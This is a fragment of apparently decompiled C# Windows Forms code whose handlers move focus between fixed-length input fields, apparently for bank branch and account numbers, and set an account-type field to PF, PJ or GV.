	private void snt_ag_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_ag).get_Text().Length == 4)
		{
			((Control)snt_cc).Focus();
		}
	}

	private void snt_cc1_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_cc1).get_Text().Length == 6)
		{
			((Control)snt_cc2).Focus();
		}
	}

	private void snt_cc_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_cc).get_Text().Length == 2)
		{
			((Control)snt_cc1).Focus();
		}
	}

	private void r1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("PF");
	}

	private void r2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("PJ");
	}

	private void r3_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("GV");
	}

	private void finaliza_cc_Paint(object sender, PaintEventArgs e)
	{
		((Control)campo_da).Focus();
	}

	private void campo_da_TextChanged(object sender, EventArgs e)
	{
		if (((Control)campo_da).get_Text().Length == 8)
		{
			((Control)campo_se).Focus();
		}
	}

	private void campo_se_TextChanged(object sender, EventArgs e)
	{
		if (((Control)campo_se).get_Text().Length == 6)
		{
			((Control)campo_di).Focus();
		}
	}
}
